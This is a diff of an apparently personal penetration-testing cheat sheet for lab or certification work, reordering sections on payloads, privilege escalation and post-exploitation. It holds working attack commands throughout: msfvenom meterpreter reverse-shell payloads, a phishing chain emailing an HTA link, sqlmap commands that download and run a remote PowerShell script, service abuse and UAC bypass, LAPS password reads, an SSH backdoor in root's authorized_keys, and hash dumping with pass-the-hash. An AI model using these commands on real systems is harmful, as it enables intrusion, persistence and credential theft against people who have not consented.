@@ -131,10 +131,37 @@ sudo bloodhound-python -dc dc01.jijistudio.com -ns 172.16.116.100 -d jijistudio.
 <br>
 
 ## Active Directory Attacks 
+<br>
+<br>
+<br>
 
 
 
+## Payloads & Footholds 
+#### VBA Payload 
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
+	set EXITFUNC thread
+```
 
+### Phishing + DotNetToJScript
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 -f csharp
+DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js
+
+sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168.45.201/download.hta
+```
+
+### SQLmap (OS-Shell) 
+```
+sqlmap -r post.req -p artist --os-shell
+sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
+```
+
+
+<br>
+<br>
+<br>
 
 #### File Transfer & Download
 ```
@@ -200,8 +227,12 @@ sudo ip route add 172.16.170.0/24 dev ligolo
 ssh root@IP -D 1080
 sudo proxychains4 ...
 ```
+<br>
+<br>
+<br>
 
-#### PrivEsc - Service Abuse
+## Privilege Escalation
+#### Service Abuse
 ```
 .\PowerUp.ps1
 Invoke-AllChecks
@@ -209,7 +240,7 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username 'dcorp\student551' -Verbose
 net localgroup administrators (check your user was added)
 ```
 
-#### Privesc - UACBypass.ps1
+#### UACBypass.ps1
 https://github.com/Octoberfest7/OSEP-Tools/blob/main/uacbypass.ps1
 
 #### LAPS 
@@ -222,35 +253,14 @@ Get-DomainObject -Identity web05 -Properties ms-Mcs-AdmPwd
 run post/windows/gather/credentials/enum_laps 
 ```
 
-#### VBA Payload 
-```
-msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
-	set EXITFUNC thread
-```
-
-### Phishing + DotNetToJScript
-```
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 -f csharp
-DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js
-
-sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168.45.201/download.hta
-```
-
-### SQLmap (OS-Shell) 
-```
-sqlmap -r post.req -p artist --os-shell
-sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
-```
-
-
 <br>
 <br>
 <br>
 
 
 
-## Post-Exploitation (Linux) 
-### Linux - SSH backdoor 
+## Post-Exploitation 
+### SSH backdoor 
 ```
 cd /root
 mkdir .ssh 
@@ -258,13 +268,13 @@ cd .ssh
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCYAcnDL/a0CEBRiUHdhpLZQv6BLU1l5yB2wkgIBjJbZoWrXlALu3g8adnZkLl55A6/ph68JGQBqDWENBm6FBpaxIInbWPOPPFnUOYP3CQuksPO0785lGecR/4IoWvdTiiu6M5DfAzc7zzlIzNrnIV50zxa48f5b7dTyqjfHjP4h2jwbkA/NwA3KXSw9/9x5chiwVmfHqTQHVmYz8wDwVv4NhJQm/V7SHKKekMuhX+Ei4+pgwCRbr1h2RbFcnol3zZkb0NOBMTrJRhirXJqM6Fqj/I0T/EEv/O3rf4cW6k6Lq/+b9rrOFwrwpc7ElXSxJaKKlpbzV1mW1BtR7yvFVAd5tGdKmRsEAAEvPvlxhit1+EQuJChAt7TNQTEm8uqXjkJ8+TXjHFkVrOz1Z5BAuwBJEB8Tgd3zxaapkenc/APrHbfwzsJOZOqLVsrVEhgocaV7wu3QKwj8X8BtHR89D5PwKTyVHSHawyFdMq7UsM2UAgHfmyQN+Z/ZcDIOMppqc= kali@kali" >> /root/.ssh/authorized_keys
 ssh root@192.168.154.164
 ```
-#### Linux - SSH keys 
+#### SSH keys 
 ```
 sudo chmod 600 id_rsa 
 sudo ssh -i id_rsa final\\tommy@172.16.154.184 
 ```
 
-## Post-Exploitation (Windows) 
+#### Dumping Hashes
 ```
 sudo /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb . -username kali -password kali
 net use \\192.168.49.51\smb /user:kali kali 
@@ -287,7 +297,6 @@ sudo crackmapexec smb 192.168.210.16 -u ZPH-SVRCDC01$ -H 'd47a6d90e1c5adf4200227
 
 sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes ':5bdd6a33efe43f0dc7e3b2435579aa53' administrator@192.168.110.55 
 ```
-
 
 <br>
 <br>
